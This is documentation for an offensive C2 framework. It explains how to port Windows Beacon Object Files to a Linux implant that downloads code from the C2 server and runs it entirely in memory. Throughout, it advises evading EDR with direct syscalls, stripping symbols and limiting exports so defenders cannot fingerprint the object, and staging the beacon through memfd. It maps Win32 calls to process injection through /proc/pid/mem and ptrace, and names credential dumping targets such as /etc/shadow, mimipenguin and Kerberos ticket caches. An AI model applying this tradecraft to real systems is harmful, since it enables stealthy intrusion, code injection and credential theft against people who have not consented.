# Porting Windows BOFs to Linux

LazyOwn ships the only open-source C2 beacon with first-class Beacon Object
File support for Linux targets. This document explains how to port an
existing Windows BOF to Linux and how to run it through BlackSandBeacon.

Audience: operators and tool authors comfortable with C, the Windows BOF
contract, and Linux internals (syscalls, ELF, `/proc`).

---

## What is a Linux BOF in LazyOwn

A Linux BOF is a position-independent ELF object (`.x64.o`, compiled
freestanding) loaded into the running BlackSandBeacon process by the
native in-memory **RunELF loader**. The beacon fetches the object from the
C2, maps it entirely in RAM (W^X trampolines, no disk writes), resolves the
BOF's imports against the beacon's own exported symbol table, and invokes
the `go` entry point. The BOF runs in the beacon's address space, can read
and write the beacon's memory, and returns output to the operator through
the same `datap` callback API used by Windows BOFs.

It is not a separate process. It is never written to disk on the target —
neither the beacon (memfd staging) nor the BOF (in-memory load). It cannot
be reused after the beacon exits because the mapping disappears with the
process.

Compare this with the Windows BOF model:

| Aspect | Windows BOF | LazyOwn Linux BOF |
|---|---|---|
| Object format | COFF | Freestanding PIC ELF object (`.x64.o`) |
| Loader | Cobalt Strike / Sliver COFF loader | Native in-memory `RunELF` loader |
| Resolution | Custom COFF symbol resolver | RunELF relocation against beacon exports |
| API contract | `datap` + `BeaconPrintf` + `BeaconOutput` | Same names, same signatures |
| Entry point | `go(char *args, int alen)` | `go(char *args, int alen)` |
| Build flags | `cl /c` or MinGW `-c` | `gcc -c -fPIC -nostdlib -m64` |

Because the `datap` API is preserved, the porting effort is concentrated
in (a) replacing Win32 calls and (b) updating includes and types.

---

## Minimum viable Linux BOF

`beacon_api.h` is shipped by the BlackSandBeacon SDK at
`external/.exploit/blacksandbeacon/bof/include/beacon_api.h` after the
`blacksandbeacon` addon clones and builds the runtime. Include it from
that path (`-I bof/include`) or copy it next to your BOF source. Direct
syscall helpers live beside it in `bof/include/syscalls.h`.

```c
#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include "beacon_api.h"

void go(char *args, int alen) {
    datap parser;
    BeaconDataParse(&parser, args, alen);
    int interval = BeaconDataInt(&parser);
    BeaconPrintf(CALLBACK_OUTPUT, "linux bof received interval=%d uid=%d", interval, getuid());
}
```

Build (from the BlackSandBeacon checkout):

```
gcc -c -fPIC -nostdlib -m64 -O2 -I bof/include mybof.c -o build/bof/mybof.x64.o
```

Stage and deliver:

```
make bofs && cp build/bof/mybof.x64.o ../../../sessions/temp_uploads/bofs/
bof_run mybof <beacon_id>
```

`bof_run` queues a `bof:<c2_url>/download/bofs/mybof` command on the live
beacon; the beacon downloads the object, loads it with RunELF, calls `go`,
and pipes any `BeaconPrintf` output back over the C2 channel.

---

## Mapping common Win32 calls to Linux equivalents

| Windows call | Linux equivalent | Notes |
|---|---|---|
| `OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid)` | `open("/proc/<pid>/mem", O_RDWR)` | Requires capability `CAP_SYS_PTRACE` or root |
| `ReadProcessMemory(h, addr, buf, n, NULL)` | `pread(fd, buf, n, addr)` against `/proc/<pid>/mem` | Use `ptrace(PTRACE_ATTACH)` first if you need stop-the-world semantics |
| `WriteProcessMemory(...)` | `pwrite(fd, buf, n, addr)` | Same |
| `VirtualAllocEx(...)` | `mmap(NULL, size, PROT_RWX, MAP_PRIVATE \| MAP_ANONYMOUS, -1, 0)` then inject | Or write directly into a `PROT_WRITE` region you already mapped via mremap |
| `CreateRemoteThread(...)` | `ptrace(PTRACE_POKEUSER, ...)` to set RIP + `PTRACE_CONT`, or hook a known function pointer | Linux has no syscall-level remote thread API; either ptrace or hijack `.init_array` |
| `NtQuerySystemInformation` | Parse `/proc/<pid>/status`, `/proc/<pid>/maps`, `/proc/<pid>/cmdline` | All text, all stable kernel ABI |
| `EnumProcesses` | `readdir("/proc")` filtering numeric entries | Free, no special privileges |
| `GetCurrentProcessId` | `getpid()` | |
| `GetCurrentThreadId` | `gettid()` (Linux) or `syscall(SYS_gettid)` | |
| `Sleep(ms)` | `nanosleep` with `tv_sec`/`tv_nsec` | |
| `CreateFileA` | `open(path, O_RDWR \| O_CREAT, 0600)` | |
| `ReadFile` / `WriteFile` | `read` / `write` | |
| `RegOpenKeyEx` | not applicable — read `/etc/<service>.conf` or systemd unit files | |
| `LookupAccountName` | `getpwnam`, `getpwuid` from `<pwd.h>` | |
| `LsaCallAuthenticationPackage` (LSASS dump) | parse `/etc/shadow` or `dump` LSA-equivalent (`mimipenguin`, GNOME keyring) | Capability-gated |
| `GetTokenInformation` | parse `/proc/self/status` (`Uid:`, `Gid:`, `CapEff:`) | |
| `AdjustTokenPrivileges` | not applicable — set capabilities with `cap_set_proc` or fork+setuid | |

---

## Direct syscalls (when libc is too noisy)

BlackSandBeacon supports direct syscalls through inline assembly stubs.
Use this when an EDR or audit hook is sitting on libc and you cannot trust
its wrappers.

```c
static inline long sys_openat(int dirfd, const char *path, int flags, int mode) {
    long ret;
    __asm__ volatile (
        "mov $257, %%rax\n"
        "syscall\n"
        : "=a"(ret)
        : "D"(dirfd), "S"(path), "d"(flags), "r"(mode)
        : "rcx", "r11", "memory"
    );
    return ret;
}
```

Syscall numbers live in `<asm/unistd_64.h>`. Use these only on x86_64.
ARM64 has different calling conventions and syscall numbers; conditional
compile when targeting both.

Avoid direct syscalls for anything you can do through `/proc`. The text
interface is harder for an EDR to lie about than a libc call it can hook.

---

## The `datap` API surface

These functions are exported by the BlackSandBeacon beacon itself; the
RunELF loader relocates the BOF's imports against that export table at
load time. Source-compatible with Windows BOF.

| Function | Purpose |
|---|---|
| `BeaconDataParse(datap *parser, char *buf, int len)` | Initialise the parser over the argument buffer |
| `int BeaconDataInt(datap *parser)` | Consume a 32-bit integer |
| `short BeaconDataShort(datap *parser)` | Consume a 16-bit integer |
| `char *BeaconDataExtract(datap *parser, int *len)` | Consume a length-prefixed string or blob |
| `int BeaconDataLength(datap *parser)` | Remaining bytes in the buffer |
| `void BeaconPrintf(int type, const char *fmt, ...)` | Format and send output (type 0 = OUTPUT) |
| `void BeaconOutput(int type, const char *buf, int len)` | Send a binary blob of output |

The parser format is byte-for-byte the same as the Windows BOF buffer
layout produced by `bof-launcher` and Cobalt Strike's aggressor scripts.
Existing argument-packing utilities work unchanged.

---

## Building, staging, and delivering

1. Compile the BOF as a freestanding PIC object:
   ```
   gcc -c -fPIC -nostdlib -m64 -O2 -I bof/include mybof.c -o build/bof/mybof.x64.o
   ```
   or use the per-object make target:
   ```
   make bof-mybof
   ```
   The `-nostdlib` flag keeps libc out of the object; the beacon provides
   the `BeaconData*`/`BeaconPrintf` exports instead.
2. Strip it to remove debug symbols that would help defenders:
   ```
   strip --strip-unneeded build/bof/mybof.x64.o
   ```
3. Stage to LazyOwn's BOF delivery directory:
   ```
   cp build/bof/mybof.x64.o sessions/temp_uploads/bofs/
   ```
4. Queue it on an active beacon:
   ```
   bof_run mybof <beacon_id>
   ```

   `bof_run` builds the `bof:https://<lhost>:<c2_port>/download/bofs/mybof`
   command, posts it to the C2 queue, and the live beacon fetches the
   object over the encrypted channel, loads it with RunELF and invokes `go`.

---

## Pitfalls

- **Forgetting `-fPIC`.** Without position-independent code the loader
  cannot relocate the BOF and the load fails. The beacon reports the
  failure back to the operator over the C2 channel.
- **Linking libc in.** `-nostdlib` is required; a BOF that pulls libc
  symbol references the beacon does not export fails to relocate. Prefer
  direct syscalls (`bof/include/syscalls.h`) or `/proc` parsing.
- **Exporting more than `go`.** Mark internal helpers `static` so the
  symbol table stays small. Less surface for defenders to fingerprint.
- **Returning early without `BeaconOutput`.** The operator sees nothing and
  assumes the BOF crashed. Always emit at least one `BeaconPrintf` even
  for success.
- **Calling `exit()`.** That terminates the beacon process. Return from
  `go` instead.
- **Allocating with `malloc` without freeing.** The beacon process keeps
  running; you leak its memory. Free everything you allocate.
- **Architecture mismatch.** A BOF compiled for x86_64 will not load on an
  ARM beacon. Compile per target architecture and stage as
  `sessions/temp_uploads/bofs/mybof-x86_64.x64.o` and
  `sessions/temp_uploads/bofs/mybof-aarch64.x64.o`.

---

## Reference BOFs to port first

Good starting candidates from the Windows BOF ecosystem (all have stable
upstream sources and useful Linux equivalents):

- `whoami` — trivial port; great smoke test.
- `ls` of `/etc`, `/home`, `/root` — exercises file enumeration and
  `BeaconOutput` of large blobs.
- `netstat` — read `/proc/net/tcp` + `/proc/net/tcp6`, decode hex.
- `ps` — parse `/proc/*/comm` and `/proc/*/status`.
- `cat /etc/shadow` (capability-gated) — exercises privileged reads.
- `arp` — parse `/proc/net/arp`.

Once these work end-to-end against a test beacon, more complex BOFs
(token introspection, kerberos ticket extraction from `kinit` cache,
namespace enumeration, container escape probes) follow the same recipe.

---

## Contributing a BOF back

If you port or write a BOF that other operators would benefit from, open
a pull request that:

1. Adds the source to the BlackSandBeacon repository under `bof/<name>/`
   plus a `make bof-<name>` target.
2. Adds a `bofs/<name>.yaml` catalog entry to LazyOwn (see
   `bofs/README.md` for the delivery-contract schema).
3. Adds a row to `docs/ATTACK_MATRIX.md` if it covers a new technique.
4. Includes a short test note: which kernel, which distro, which beacon
   build you tested against.

We do not accept BOFs whose only purpose is destruction (wiping disks,
disabling logging permanently) — see the impact section of
`docs/ATTACK_MATRIX.md`.
